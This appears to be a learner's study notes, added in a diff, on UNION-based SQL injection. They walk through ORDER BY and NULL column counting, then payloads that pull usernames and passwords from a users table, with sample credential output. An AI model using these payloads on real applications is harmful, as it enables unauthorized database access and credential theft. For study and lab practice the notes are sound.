@@ -1,0 +1,113 @@
+SQL Injection Payloads
+
+>>>....1) To determine the no. of columns in the table
+
+>> 1ST METHOD : ORDER BY clauses
+
+SELECT * FROM customers ORDER BY 1;
+SELECT * FROM customers ORDER BY 2;
+SELECT * FROM customers ORDER BY 3;
+etc.
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc.
+
+until the error doesn't come as below,
+ Error: 1st ORDER BY term out of range - should be between 1 and 5
+
+ Error: The ORDER BY position number 7 is out of range of the number of items in the select list.
+
+
+>> 2ND METHOD : UNION SELECT NULL, you determine the column count by adding NULL values one at a time.
+
+SELECT * FROM customers UNION SELECT NULL
+SELECT * FROM customers UNION SELECT NULL,NULL
+etc.
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+
+until the error doesn't comes as below,
+ Error: SELECTs to the left and right of UNION do not have the same number of result columns
+
+ Error : All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+
+	After that, When the error disappears, the number of NULL values = number of columns in the original query.
+
+>Exploitation Phase:
+SELECT * FROM CUSTOMERS ' UNION SELECT 'TEST',NULL,NULL,NULL,NULL--
+
+
+
+			Exploitation Phase of 2nd method:
+			Column count
+			     ↓
+			UNION SELECT NULL,NULL,NULL,NULL,NULL
+			     ↓
+			Find reflected columns
+			     ↓
+			Put useful SQL expression in reflected column ('database()', 'version()', 'test')
+			      ↓
+			Retrieve database information
+			     ↓
+			Identify tables
+			     ↓
+			Identify columns
+			     ↓
+			Retrieve target data
+
+
+
+
+
+>>>.....2) Using a SQL injection UNION attack to retrieve interesting data
+
+First determine the no.of columns using 2nd method,
+then do the below query;
+
+' UNION SELECT <col_name1>, <col_name2> FROM <table_name>--
+' UNION SELECT username, password FROM users--
+
+for eg:
+SELECT * FROM customers
+UNION
+SELECT NULL, first_name, last_name, NULL, NULL
+FROM customers;
+
+Output: 
+	It will give all the data from the injected query column
+
+
+Note: You will not always find the target table with the exact number of columns you want to retrieve. The original query may return only 2 or 3 columns, while the target table may contain more columns. In such cases, use NULL as placeholders for the unused columns to match the number of columns in the original query.
+
+' UNION SELECT <col_name1>, <col_name2>, NULL, NULL FROM <table_name>--
+
+
+
+
+
+>>>....3) Retrieving multiple values within a single column
+
+You can retrieve multiple values together within single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+Steps:
+First determine no.of columns(2nd method),
+then check which column is getting reflected into the response(2nd solution),
+then in that column insert your query.
+
+' UNION SELECT NULL,username || '~' || password FROM users-- 
+
+where, 
+	double-pipe sequence || which is a string concatenation operator on Oracle
+	separated by the ~ character
+
+Output:
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
